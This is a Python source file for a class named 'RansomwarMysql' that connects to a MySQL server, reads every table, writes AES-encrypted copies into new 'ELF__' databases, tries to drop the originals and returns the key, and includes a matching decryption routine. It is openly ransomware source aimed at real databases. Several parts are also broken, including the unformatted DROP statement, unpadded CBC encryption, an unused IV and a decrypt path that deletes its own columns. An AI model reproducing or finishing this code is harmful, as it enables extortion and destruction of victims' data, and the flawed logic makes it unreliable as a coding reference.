import mysql.connector
import base64
import os
from Crypto.Cipher import AES

class RansomwarMysql:
    defult_key = os.urandom(16)
    
    def __init__(self , key:str = None , *args, **kwargs):
        self.host = kwargs.get("host")
        self.mydb = mysql.connector.connect(
            host=self.host,
            user=kwargs.get("username"),
            password=kwargs.get("password"),
        )
        if key != None:
            self.defult_key = key.encode()

    def get_all_databases(self):
        """
        Returns a list of all database names in the MySQL connection.
        """
        mycursor = self.mydb.cursor()
        mycursor.execute("SHOW DATABASES")
        databases = mycursor.fetchall()
        return [database[0] for database in databases]

    def get_all_tables(self, database_name:str):
        """
        Returns a list of all table names in the given database.
        """
        mycursor = self.mydb.cursor()
        mycursor.execute(f"USE {database_name}")
        mycursor.execute("SHOW TABLES")
        tables = mycursor.fetchall()
        return [table[0] for table in tables]

    def get_all_data(self, table_name:str ) -> list:
        """
        Returns all data from the given table as a list of dictionaries.
        table_name : str = get table name for read all of columes 
        """
        mycursor = self.mydb.cursor()
        mycursor.execute(f"SELECT * FROM {table_name}")
        rows = mycursor.fetchall()
        columns = [column[0] for column in mycursor.description]
        data = [dict(zip(columns, row)) for row in rows]
        return data

    def encrypt_data(self, data:any):
        """
        Encrypts the given data using the AES algorithm in CBC mode.
        data : Any = get data form columes in tables and encrypt it.
        """
        cipher = AES.new(self.defult_key, AES.MODE_CBC)
        iv = os.urandom(16) 
        ciphertext = cipher.encrypt(bytes(str(data), "utf-8"))
        combined = iv + ciphertext
        return base64.b64encode(combined).decode()
    
    def decrypt_data(self , iv :any, data:any):
        """
        Decrypt s the given encrypted data using the AES algorithm in CBC mode
        data : Any = Encrypted Data
        iv   : Any = Initialization vector used during encryption
        """    
        decoded_data = base64.b64decode(data)
        cipher = AES.new(self.defult_key, AES.MODE_CBC, iv=iv)
        plaintext = cipher.decrypt(decoded_data)
        return plaintext
    
    def encrypt_database(self, database_name:str):
        """
        Encrypts all data in the given database using the AES algorithm in CBC mode.
        databases_name : str  = get databases for connect and get datas
        """
        
        data_enc = ""
        if "ELF__" not in database_name:
            mycursor = self.mydb.cursor()
            mycursor.execute(f"USE {database_name}")
            table_names = self.get_all_tables(database_name)
            new_database_name = f"ELF__{database_name}"
            mycursor.execute(f"CREATE DATABASE IF NOT EXISTS {new_database_name}")
            for table_name in table_names:
                data = self.get_all_data(table_name)
                new_table_name = f"ELF__{table_name}"
                mycursor.execute(f"CREATE TABLE IF NOT EXISTS {new_database_name}.{new_table_name} (id INT PRIMARY KEY AUTO_INCREMENT, iv BLOB, encrypted_data TEXT)")
                for row in data:
                    for col in row:
                        try:data_enc += self.encrypt_data(str(row[col]))
                        except:data_enc += ""
                    mycursor.execute(f"INSERT INTO {new_database_name}.{new_table_name} (encrypted_data) VALUES (%s)", (data_enc,))
            mycursor.execute("DROP DATABASE {database_name}; ") 
            return str(self.defult_key)
        
        return False
    
    def decrypt_database(self, database_name:str, key:str):
        """
        Decrypts all data in the given database using the AES algorithm in CBC mode and writes it to a new database.
        databases_name : str  = get databases for connect and decrypt it.
        key : str = get key for decrypt data.
        """
        if "ELF__" in database_name:
            self.defult_key = key.encode()
            new_database_name = database_name.split("__")[1]
            mycursor = self.mydb.cursor()
            mycursor.execute(f"CREATE DATABASE IF NOT EXISTS {new_database_name}")
            mycursor.execute(f"USE {database_name}")
            table_names = self.get_all_tables(database_name)
            for table_name in table_names:
                if table_name.startswith("ELF__"):
                    new_table_name = table_name.replace("ELF__", "")
                    mycursor.execute(f"CREATE TABLE IF NOT EXISTS {new_database_name}.{new_table_name} LIKE {database_name}.{table_name}")
                    mycursor.execute(f"INSERT INTO {new_database_name}.{new_table_name} (SELECT * FROM {database_name}.{table_name})")
                    mycursor.execute(f"UPDATE {new_database_name}.{new_table_name} SET encrypted_data = NULL")
                    mycursor.execute(f"UPDATE {new_database_name}.{new_table_name} SET iv = NULL")
                    mycursor.execute(f"ALTER TABLE {new_database_name}.{new_table_name} DROP COLUMN iv")
                    mycursor.execute(f"ALTER TABLE {new_database_name}.{new_table_name} DROP COLUMN encrypted_data")
                    mycursor.execute(f"USE {new_database_name}")
                    mycursor.execute(f"SELECT * FROM {new_table_name}")
                    rows = mycursor.fetchall()
                    for row in rows:
                        for _, col_name in enumerate(mycursor.description):
                            if col_name[0] != "id":
                                iv = row[0]
                                encrypted_data = row[1]
                                result_text = self.decrypt_data(iv , encrypted_data)
                                mycursor.execute(f"UPDATE {new_database_name}.{new_table_name} SET {col_name[0]} = %s WHERE id = %s", (result_text.decode(), row[0]))

            mycursor.execute(f"USE {new_database_name}")
        return False    
